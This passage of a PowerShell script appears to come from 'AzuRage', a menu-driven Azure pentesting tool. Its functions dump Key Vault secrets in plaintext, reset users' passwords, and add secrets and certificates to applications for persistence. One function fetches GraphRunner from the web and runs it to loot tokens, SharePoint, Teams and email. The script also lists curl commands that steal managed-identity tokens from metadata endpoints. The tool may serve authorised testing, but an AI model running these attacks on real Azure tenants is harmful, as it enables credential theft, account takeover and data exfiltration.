            $PublicAccess = if ($NetworkRuleSet.DefaultAction -eq "Allow") { "Exposed to Public" } else { "Restricted Access" }
            $IPRules = $NetworkRuleSet.IpRules | ForEach-Object { $_.IPAddressOrRange }

            # Access policies
            $AccessPolicies = $Vault.AccessPolicies | ForEach-Object {
                @{
                    TenantId = $_.TenantId
                    ObjectId = $_.ObjectId
                    Permissions = ($_ | Select-Object -ExpandProperty PermissionsToSecrets)
                }
            }

            # Managed identities assigned to the Key Vault
            $ManagedIdentity = if ($Vault.EnabledForDeployment -or $Vault.EnabledForTemplateDeployment -or $Vault.EnabledForDiskEncryption) {
                "Yes"
            } else {
                "No"
            }

            # Add findings to results
            $AuditResults += [PSCustomObject]@{
                VaultName       = $VaultName
                ResourceGroup   = $ResourceGroup
                Location        = $Location
                PublicAccess    = $PublicAccess
                IPRules         = ($IPRules -join ", ")
                AccessPolicies  = ($AccessPolicies | ConvertTo-Json -Depth 2)
                ManagedIdentity = $ManagedIdentity
            }
        }

        # Output audit results
        $AuditResults | Format-Table -AutoSize

        Write-Host "Second check - Check for Keys and Secrets..."
        
        foreach ($Vault in $KeyVaults) {
            $VaultName = $Vault.VaultName
            $ResourceGroup = $Vault.ResourceGroupName

            Write-Host "Checking Key Vault: $VaultName in Resource Group: $ResourceGroup" -ForegroundColor Yellow

            try {
   	 # Fetch all secrets in the Key Vault
   	 $Secrets = Get-AzKeyVaultSecret -VaultName $VaultName -ErrorAction Stop
   	 Write-Host "`nSecrets in Key Vault: $VaultName" -ForegroundColor Green
   	 foreach ($Secret in $Secrets) {
   	 Write-Host " - Secret Name: $($Secret.Name), Secret Version: $($Secret.Version)"

         # Fetch the secret value
         $SecretValue = (Get-AzKeyVaultSecret -VaultName $VaultName -Name $Secret.Name).SecretValue |  ConvertFrom-SecureString -AsPlainText
         Write-Host "   Secret Value: $SecretValue" -ForegroundColor Cyan
    }

    # Fetch all keys in the Key Vault
    $Keys = Get-AzKeyVaultKey -VaultName $VaultName -ErrorAction Stop
    Write-Host "`nKeys in Key Vault: $VaultName" -ForegroundColor Green
    foreach ($Key in $Keys) {
        Write-Host " - Key Name: $($Key.Name), Key Version: $($Key.Version)"
    }
            } catch {
                Write-Host "Failed to access keys or secrets in $VaultName. Check permissions." -ForegroundColor Red
            }
        }
    } catch {
        Write-Host "Error occurred during the audit process: $($_.Exception.Message)" -ForegroundColor Red
    }
 
  	
Show-CommonMisconfigurationsMenu 
}

function Check-AppsEnvVariable {
    Write-Host "Checking information on current user.." -ForegroundColor Cyan
   
    Get-MgUserLicenseDetail -UserId (Get-AzADUser -UserPrincipalName (Get-AzContext).Account.Id).Id
   
 # Call the common misconfigurations menu
    Show-CommonMisconfigurationsMenu
}




# Authenticate Other Attacks
function Authenticate-OtherAttacks {
    Write-Host "`n===================================" -ForegroundColor Cyan
    Write-Host "Do you have permissions?" -ForegroundColor Green
    Write-Host "===================================" -ForegroundColor Cyan
    Write-Host "1. Change the user password" -ForegroundColor Yellow
    Write-Host "2. Add new secret to Service Principal" -ForegroundColor Yellow
    Write-Host "3. Add new certificate to the application" -ForegroundColor Yellow
    Write-Host "4. Back to Main Menu" -ForegroundColor Yellow

    $choice = Read-Host "Enter your choice"
    Process-AuthenticatedOtherAttacksChoice -choice $choice
    
}

# Process Other Attacks Submenu Choices
function Process-AuthenticatedOtherAttacksChoice {
    param ([string]$choice)

    switch ($choice) {
        "1" {
            $UserPrincipalName = Read-Host "Enter the username (email) of the user whose password you want to change (e.g., user@domain.com)"
            $NewPassword = Read-Host "Enter the new password for the user (plain text)"
            Add-ChangeUserPassword -UserPrincipalName $UserPrincipalName -NewPassword $NewPassword
            Authenticate-OtherAttacks
        }
        "2" {
            Write-Host "Functionality to add a new secret to Service Principal is not yet implemented." -ForegroundColor Cyan
            Add-ServicePrincipalSecret
        }
        "3" {
            Write-Host "Functionality to add a new certificate to the application is not yet implemented." -ForegroundColor Cyan
            Add-ApplicationCertificate
        }
        
        "4" {
            Show-MainMenu
        }
        default {
            Write-Host "Invalid choice! Please select a valid option." -ForegroundColor Red
            Start-Sleep -Seconds 2
            Authenticate-OtherAttacks
        }
    }
}

# Changing User Password Function
function Add-ChangeUserPassword {
    param (
        [Parameter(Mandatory = $true)]
        [string]$UserPrincipalName,
        [Parameter(Mandatory = $true)]
        [string]$NewPassword
    )

    try {
        
        Write-Host "Login with Username who have the authority to change the password";Start-Sleep -Seconds 3
        
        Write-Host "Redirecting to a browser for authentication..." -ForegroundColor Cyan
        Connect-MgGraph -NoWelcome -ErrorAction Stop
        Write-Host "Authentication successful!" -ForegroundColor Green

        $params = @{
            passwordProfile = @{
                forceChangePasswordNextSignIn = $false
                forceChangePasswordNextSignInWithMfa = $false
                password = $NewPassword
            }
        }

        Update-MgUser -UserId $UserPrincipalName -BodyParameter $params -ErrorAction Stop
        Write-Host "Password successfully updated for user '$UserPrincipalName'." -ForegroundColor Yellow
    } catch {
        Write-Host "An error occurred: $_" -ForegroundColor Red
    } finally {
        Disconnect-MgGraph -ErrorAction SilentlyContinue
        Write-Host "Disconnected from Microsoft Graph." -ForegroundColor Cyan
    }
}

#Adding applicaiton secret

function Add-ServicePrincipalSecret {
    try {
        
        Write-Host "Login.. " -ForegroundColor Green; Start-Sleep -Seconds 2
        Write-Host "You will now be redirected to a browser for login. Please authenticate with your admin credentials..." -ForegroundColor Cyan
        
        # Connect to Microsoft Graph using interactive login
        Connect-MgGraph -NoWelcome -ErrorAction Stop
        Write-Host "Successfully authenticated with Microsoft Graph!" -ForegroundColor Green

        # Prompt for the application details
        $UserPrincipalName = Read-Host "Enter the username (email) of the application owner (e.g., user@domain.com)"
        $AppDisplayName = Read-Host "Enter the display name for the new password credential (e.g., MyAppSecret)"

        # Retrieve the user ID
        $userId = (Get-MgUser -Filter "userPrincipalName eq '$UserPrincipalName'").Id
        if (-not $userId) {
            throw "No user found with the username '$UserPrincipalName'."
        }

        # Retrieve the application ID owned by the user
        $appId = (Get-MgUserOwnedObject -UserId $userId).Id
        if (-not $appId) {
            Write-Host "No applications owned by the user were found." -ForegroundColor Yellow
            return
        }

        # Prepare the password credential details
        $passwordCred = @{
            displayName = $AppDisplayName
        }

        # Add the new password credential
        $newPassword = Add-MgApplicationPassword -ApplicationId $appId -PasswordCredential $passwordCred
        Write-Host "New password credential created successfully!" -ForegroundColor Green
        Write-Host "Password: $($newPassword.SecretText)" -ForegroundColor Yellow
    } catch {
        Write-Host "An error occurred: $_" -ForegroundColor Red
    } 

Authenticate-OtherAttacks 
}


#Add Certificate

function Add-ApplicationCertificate {
    try {
        Write-Host "You will now be redirected to a browser for login. Please authenticate with your admin credentials..." -ForegroundColor Cyan

        # Connect to Microsoft Graph using interactive login
        Connect-MgGraph -NoWelcome -ErrorAction Stop
        Write-Host "Successfully authenticated with Microsoft Graph!" -ForegroundColor Green

        # Prompt for application and certificate details
        $UserPrincipalName = Read-Host "Enter the username (email) of the application owner (e.g., user@domain.com)"
        $AppDisplayName = Read-Host "Enter the display name of the application to add the certificate to"
        $CertPath = Read-Host "Enter the full path to the .pem file for the certificate"

        # Validate certificate file
        if (-not (Test-Path $CertPath)) {
            throw "Certificate file not found at the specified path: $CertPath"
        }

        # Read and clean the PEM certificate file
        $CertificateData = Get-Content -Path $CertPath -Raw
        if (-not $CertificateData) {
            throw "Failed to read certificate file. Ensure it is a valid .pem file."
        }

        # Remove PEM headers and extract Base64-encoded content
        $CertificateBase64 = $CertificateData -replace "-----BEGIN CERTIFICATE-----", "" `
                                             -replace "-----END CERTIFICATE-----", "" `
                                             -replace "`n", ""

        # Convert Base64 string to byte array
        $CertificateBytes = [System.Convert]::FromBase64String($CertificateBase64)

        # Retrieve the user ID
        $userId = (Get-MgUser -Filter "userPrincipalName eq '$UserPrincipalName'").Id
        if (-not $userId) {
            throw "No user found with the username '$UserPrincipalName'."
        }

        # Retrieve all owned objects for the user
        $ownedObjects = Get-MgUserOwnedObject -UserId $userId

        # Find the application by displayName in both top-level and AdditionalProperties
        $appId = $ownedObjects | Where-Object {
            ($_.DisplayName -eq $AppDisplayName) -or
            ($_.AdditionalProperties.displayName -eq $AppDisplayName)
        } | Select-Object -ExpandProperty Id

        if (-not $appId) {
            throw "No application found with the display name '$AppDisplayName' owned by the specified user."
        }

        # Create the KeyCredential object
        $keyCredential = @{
            KeyId        = [Guid]::NewGuid() # Generate a new KeyId
            Key          = $CertificateBytes
            StartDateTime = (Get-Date).ToString("o") # ISO 8601 format
            EndDateTime   = (Get-Date).AddYears(1).ToString("o") # Valid for 1 year
            Type         = "AsymmetricX509Cert"
            Usage        = "Verify"
        }

        # Add the certificate to the application
        $result = Add-MgApplicationKey -ApplicationId $appId -KeyCredential $keyCredential
        Write-Host "Certificate added successfully to the application '$AppDisplayName'!" -ForegroundColor Green
    } catch {
        Write-Host "An error occurred: $_" -ForegroundColor Red
    } finally {
        # Disconnect from Microsoft Graph
        try {
            Disconnect-MgGraph
            Write-Host "You have been logged out of Microsoft Graph." -ForegroundColor Cyan
        } catch {
            Write-Host "No active session to log out from." -ForegroundColor Yellow
        }
    }
    Authenticate-OtherAttacks 
}




# AzureHound Ingestor
function Run-AzureHoundIngestor {
    Write-Host "AzureHound Ingestor" -ForegroundColor Cyan

    $username = Read-Host "Enter your username"
    $password = Read-Host "Enter your password"
    $tenantId = Read-Host "Enter the Tenant ID"

    # Detect OS
    if ($env:OS -eq "Windows_NT") {
        $os = "windows"
        $fileName = "azurehound-windows-amd64.zip"
        $executable = "azurehound.exe"
    } else {
        $os = "linux"
        $fileName = "azurehound-linux-amd64.zip"
        $executable = "./azurehound"
    }

    # Download AzureHound
    Write-Host "Downloading AzureHound ingestor for $os..." -ForegroundColor Yellow
    $downloadUrl = "https://github.com/SpecterOps/AzureHound/releases/download/v2.2.1/$fileName"
    Invoke-WebRequest -Uri $downloadUrl -OutFile $fileName

    # Unzip AzureHound
    Write-Host "Unzipping AzureHound ingestor..." -ForegroundColor Yellow
    Expand-Archive -Path $fileName -DestinationPath "./azurehound" -Force

    # Run AzureHound
    Write-Host "Running AzureHound..." -ForegroundColor Yellow
    Set-Location -Path "./azurehound"
    $command = "$executable -u `"$username`" -p `"$password`" list --tenant `"$tenantId`" -o output.json"
    Invoke-Expression $command

    Write-Host "AzureHound output saved as output.json in the current folder. Please check and upload the file to AzureHound." -ForegroundColor Green
    Set-Location -Path ".."  # Return to original location
    Show-MainMenu
}


# GraphRunner Tools
function Run-GraphRunnerLoot {
    Write-Host "GraphRunner Tools" -ForegroundColor Cyan

    Write-Host "Importing GraphRunner..." -ForegroundColor Yellow
    Invoke-Expression -Command "(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1').Content | Invoke-Expression"
    Write-Host "Authenticating to get Graph tokens..." -ForegroundColor Yellow
    try {
        # Authenticate to get tokens
        Get-GraphTokens
        Write-Host "Tokens acquired successfully." -ForegroundColor Green
        Write-Host "Feel free to see the token and use it with $Global:GraphRunnerTokens after closing the tool" -ForegroundColor Green
        Write-Host "Run List-GraphRunnerModules command from powershell to get the full list fo commands you can run..." -ForegroundColor Yellow
        
         # Save tokens to a global variable for session persistence
        $Global:GraphRunnerTokens = $tokens
        
        #Get conditioanl access policy
        
        # Ask for search term
        $searchTerm = Read-Host "Enter a word to search in SharePoint, OneDrive, and Teams"

        # Search SharePoint and OneDrive
        Write-Host "Searching SharePoint and OneDrive for '$searchTerm'..." -ForegroundColor Yellow
        Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm $searchTerm

        # Search Teams
        Write-Host "Searching Teams for '$searchTerm'..." -ForegroundColor Yellow
        Invoke-SearchTeams -Tokens $tokens -SearchTerm $searchTerm

        # Ask for Email Search
        $emailSearch = Read-Host "Do you want to search emails as well? (yes/no)"
        if ($emailSearch -eq "yes") {
            $messageCount = [int](Read-Host "Enter the number of emails to download")
            Write-Host "Searching emails and downloading up to $messageCount messages..." -ForegroundColor Yellow
            try {
                $emails = Invoke-SearchMailbox -Tokens $tokens -MessageCount $messageCount
                $emailCount = $emails.Count
                Write-Host "Successfully downloaded $emailCount emails." -ForegroundColor Green
                if ($emailCount -lt $messageCount) {
                    Write-Host "Only $emailCount emails were available in the mailbox." -ForegroundColor Yellow
                }
            } catch {
                Write-Host "Error occurred while searching emails. Ensure sufficient permissions and connectivity." -ForegroundColor Red
            }
        } else {
            Write-Host "Skipping email search. Returning to main menu." -ForegroundColor Cyan
        }
    } catch {
        Write-Host "Failed to acquire tokens or fetch data. Please ensure GraphRunner is working correctly." -ForegroundColor Red
    }

      # Ask for Dynamic Groups Search
        $dynamicGroupSearch = Read-Host "Do you want to search for dynamic groups? (yes/no)"
        if ($dynamicGroupSearch -eq "yes") {
            Write-Host "Fetching Dynamic Groups..." -ForegroundColor Yellow
            Get-DynamicGroups -Tokens $tokens | Format-Table -AutoSize
        } else {
            Write-Host "Skipping dynamic groups search." -ForegroundColor Cyan
      }
        
    Show-MainMenu
}


function Show-OtherCommandsMenu {
    Write-Host "Useful Commands" -ForegroundColor Cyan
    Write-Host "Login using service principal:" -ForegroundColor Red 
    Write-Output 'az login --service-principal -u [--Client-ID--] -p [--Client-Secret--] -t [--Tenant-ID] --allow-no-subscription'
    Write-Host "" 
    Write-Host "Dealing with Storage:" -ForegroundColor Red 
    Write-Host ""
	Write-Host "# Check the containers in the blob" -ForegroundColor Red
	Write-Host "Invoke-WebRequest -Uri 'https://<storageaccount>.blob.core.windows.net?SASKey' -UseBasicParsing" 
	Write-Host "" 
	Write-Host "# Access a Specific Container" -ForegroundColor Red 
	Write-Host "Invoke-WebRequest -Uri 'https://<storageaccount>.blob.core.windows.net/<container>?restype=container&comp=list&SASKey' -UseBasicParsing"
	Write-Host ""
	Write-Host "# Access files inside the container" -ForegroundColor Red
	Write-Host "Invoke-WebRequest -Uri 'https://<storageaccount>.blob.core.windows.net/<container>/<blobtoaccess>?SASKey' -UseBasicParsing"
        Write-Host "Access token using identityt header :" -ForegroundColor Red
        Write-Host "Windows" -ForegroundColor Green
        Write-Output 'curl "%IDENTITY_ENDPOINT%?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%IDENTITY_HEADER%'
	Write-Host ""
	Write-Host "Linux" -ForegroundColor Green
	Write-Output 'curl -H "Secret: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?api-version=2017-09-01&resource=https://management.azure.com/"'
	Write-Host ""
	Write-Host "VMs" -ForegroundColor Green
	Write-Output 'curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"'

        
    
   Show-MainMenu
}


function Install-RequiredTools {
    Write-Host "`n===================================" -ForegroundColor Cyan
    Write-Host " Checking and Installing Required Tools " -ForegroundColor Green
    Write-Host "===================================" -ForegroundColor Cyan

    try {
        # Detect operating system
        $OS = "Unknown"
        if ($env:OS -eq "Windows_NT") {
            $OS = "Windows"
        } elseif ($env:OSTYPE -like "*linux*") {
            $OS = "Linux"
        } elseif ($PSVersionTable.Platform -eq "Unix") {
            $OS = "Linux"
        } elseif ($PSVersionTable.Platform -eq "Win32NT") {
            $OS = "Windows"
        }

        Write-Host "Detected OS: $OS" -ForegroundColor Cyan

        if ($OS -eq "Linux") {
            Write-Host "Running on Linux (Kali detected)..." -ForegroundColor Green

            # Install prerequisites for ImportExcel module
            Write-Host "Installing prerequisites for ImportExcel module..." -ForegroundColor Yellow
            sudo apt-get -y update
            sudo apt-get install -y --no-install-recommends libgdiplus libc6-dev

            # Install Git
            Write-Host "Checking and installing Git..." -ForegroundColor Yellow
            if (-Not (Get-Command git -ErrorAction SilentlyContinue)) {
                sudo apt-get install -y git
                Write-Host "Git installed successfully." -ForegroundColor Green
            } else {
                Write-Host "Git is already installed." -ForegroundColor Green
            }

            # Install Azure CLI
            Write-Host "Checking and installing Azure CLI..." -ForegroundColor Yellow
            if (-Not (Get-Command az -ErrorAction SilentlyContinue)) {
                sudo apt-get install -y azure-cli
                Write-Host "Azure CLI installed successfully." -ForegroundColor Green
            } else {
                Write-Host "Azure CLI is already installed." -ForegroundColor Green
            }

        } elseif ($OS -eq "Windows") {
            Write-Host "Running on Windows..." -ForegroundColor Green

            # Handle Chocolatey Installation
            Write-Host "Checking for Chocolatey..." -ForegroundColor Yellow
            if (-Not (Get-Command choco -ErrorAction SilentlyContinue)) {
                Write-Host "Chocolatey not found. Installing Chocolatey..." -ForegroundColor Yellow
                Set-ExecutionPolicy Bypass -Scope Process -Force
                Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
                Write-Host "Chocolatey installed successfully." -ForegroundColor Green

                # Add Chocolatey to Path (Temporary)
                 $env:Path += ";C:\ProgramData\chocolatey\bin"

                # Add Chocolatey to Path (Permanent)
                 [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Machine)

                Write-Host "Chocolatey added to Path." -ForegroundColor Green
            } else {
                Write-Host "Chocolatey is already installed." -ForegroundColor Green
            }

            # Install Git using Chocolatey
            Write-Host "Checking and installing Git..." -ForegroundColor Yellow
            if (-Not (Get-Command git -ErrorAction SilentlyContinue)) {
                choco install git -y
                Write-Host "Git installed successfully." -ForegroundColor Green
            } else {
                Write-Host "Git is already installed." -ForegroundColor Green
            }

            # Ensure Azure CLI Path and Installation
            Write-Host "Checking Azure CLI installation..." -ForegroundColor Yellow
            $azPath = "C:\Program Files\Microsoft SDKs\Azure\CLI2\wbin"
            if (Test-Path $azPath) {
                Write-Host "Azure CLI found at $azPath." -ForegroundColor Green

                # Add Azure CLI to Temporary Path
                if (-Not ($env:Path -like "*$azPath*")) {
                    Write-Host "Adding Azure CLI to temporary Path..." -ForegroundColor Yellow
                    $env:Path += ";$azPath"
                    Write-Host "Azure CLI added to temporary Path." -ForegroundColor Green
                }

                # Add Azure CLI to Permanent Path
                $currentPath = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
                if (-Not ($currentPath -like "*$azPath*")) {
                    Write-Host "Adding Azure CLI to permanent Path..." -ForegroundColor Yellow
                    [System.Environment]::SetEnvironmentVariable("Path", $currentPath + ";$azPath", [System.EnvironmentVariableTarget]::Machine)
                    Write-Host "Azure CLI added to permanent Path." -ForegroundColor Green
                }
            } else {
                Write-Host "Azure CLI not found. Installing now..." -ForegroundColor Red

                # Install Azure CLI via Chocolatey or Manual
                if (Get-Command choco -ErrorAction SilentlyContinue) {
                    choco install azure-cli -y
                    Write-Host "Azure CLI installed via Chocolatey." -ForegroundColor Green
                } else {
                    # Fallback to manual download
                    Write-Host "Downloading Azure CLI installer..." -ForegroundColor Yellow
                    $installerPath = "$env:TEMP\AzureCLIInstaller.msi"
                    Invoke-WebRequest -Uri "https://aka.ms/installazurecliwindows" -OutFile $installerPath

                    Write-Host "Running Azure CLI installer..." -ForegroundColor Yellow
                    Start-Process -FilePath msiexec.exe -ArgumentList "/i `"$installerPath`" /quiet /norestart" -Wait
                    Remove-Item $installerPath -Force
                    Write-Host "Azure CLI installed via manual installer." -ForegroundColor Green
                }

                # Add Azure CLI to Path
                Write-Host "Adding Azure CLI to Path..." -ForegroundColor Yellow
                $env:Path += ";$azPath"
                [System.Environment]::SetEnvironmentVariable("Path", $env:Path + ";$azPath", [System.EnvironmentVariableTarget]::Machine)
                Write-Host "Azure CLI added to Path." -ForegroundColor Green
            }

            # Search for Azure CLI if missing
            if (-Not (Get-Command az -ErrorAction SilentlyContinue)) {
                Write-Host "Searching for Azure CLI installation on the system..." -ForegroundColor Yellow
                $azExePath = Get-ChildItem -Path C:\ -Filter az.exe -Recurse -ErrorAction SilentlyContinue
                if ($azExePath) {
                    Write-Host "Azure CLI found at: $($azExePath.FullName). Adding to Path..." -ForegroundColor Green
                    $env:Path += ";$($azExePath.DirectoryName)"
                    [System.Environment]::SetEnvironmentVariable("Path", $env:Path + ";$($azExePath.DirectoryName)", [System.EnvironmentVariableTarget]::Machine)
                } else {
                    Write-Host "Azure CLI could not be located. Please check the installation." -ForegroundColor Red
                }
            }
        } else {
            Write-Host "Unknown OS. Exiting..." -ForegroundColor Red
            return
        }

        # Check PowerShell version
        Write-Host "Checking PowerShell version..." -ForegroundColor Yellow
        if ($PSVersionTable.PSVersion.Major -ge 7) {
            Write-Host "PowerShell version $($PSVersionTable.PSVersion) is installed." -ForegroundColor Green
        } else {
            Write-Host "PowerShell version is outdated. Please update to PowerShell 7 or higher." -ForegroundColor Red
        }

        Write-Host "All required tools have been checked and installed if necessary." -ForegroundColor Green
    } catch {
        Write-Host "An error occurred during the tool installation process: $_" -ForegroundColor Red
    }

    # Return to main menu
    if (Get-Command -Name Show-MainMenu -ErrorAction SilentlyContinue) {
        Show-MainMenu
    } else {
        Write-Host "Returning to main menu..." -ForegroundColor Cyan
    }
}









# Entry Point
Clear-Host
Write-Host " .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. " -ForegroundColor Cyan
Write-Host "| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |" -ForegroundColor Cyan
Write-Host "| |      __      | || |   ________   | || | _____  _____ | || |  _______     | || |      __      | || |    ______    | || |  _________   | |" -ForegroundColor Cyan
Write-Host "| |     /  \     | || |  |  __   _|  | || ||_   _||_   _|| || | |_   __ \    | || |     /  \     | || |  .' ___  |   | || | |_   ___  |  | |" -ForegroundColor Cyan
Write-Host "| |    / /\ \    | || |  |_/  / /    | || |  | |    | |  | || |   | |__) |   | || |    / /\ \    | || | / .'   \_|   | || |   | |_  \_|  | |" -ForegroundColor Cyan
Write-Host "| |   / ____ \   | || |     .'.' _   | || |  | '    ' |  | || |   |  __ /    | || |   / ____ \   | || | | |    ____  | || |   |  _|  _   | |" -ForegroundColor Cyan
Write-Host "| | _/ /    \ \_ | || |   _/ /__/ |  | || |   \ `--' /   | || |  _| |  \ \_  | || | _/ /    \ \_ | || | \ `.___]  _| | || |  _| |___/ |  | |" -ForegroundColor Cyan
Write-Host "| ||____|  |____|| || |  |________|  | || |    `.__.'    | || | |____| |___| | || ||____|  |____|| || |  `._____.'   | || | |_________|  | |" -ForegroundColor Cyan
Write-Host "| |              | || |              | || |              | || |              | || |              | || |              | || |              | |" -ForegroundColor Cyan
Write-Host "| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |" -ForegroundColor Cyan
Write-Host " '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' " -ForegroundColor Cyan
Write-Host "`n"  # Add a blank line for spacing
Write-Host "Welcome to AzuRage!" -ForegroundColor Yellow
Write-Host "Azure Pentesting Tool" -ForegroundColor Green
Write-Host "Script By: Backoor" -ForegroundColor Green
Write-Host "Version: 1.0" -ForegroundColor Green
Write-Host "===========================================" -ForegroundColor Cyan
Write-Host "[*] Features:" -ForegroundColor Green
Write-Host "   [+] Unauthenticated Enumeration" -ForegroundColor Green
Write-Host "   [+] Authenticated Enumeration" -ForegroundColor Green
Write-Host "   [+] Attacks" -ForegroundColor Green
Write-Host "   [+] And More!" -ForegroundColor Green

Show-MainMenu
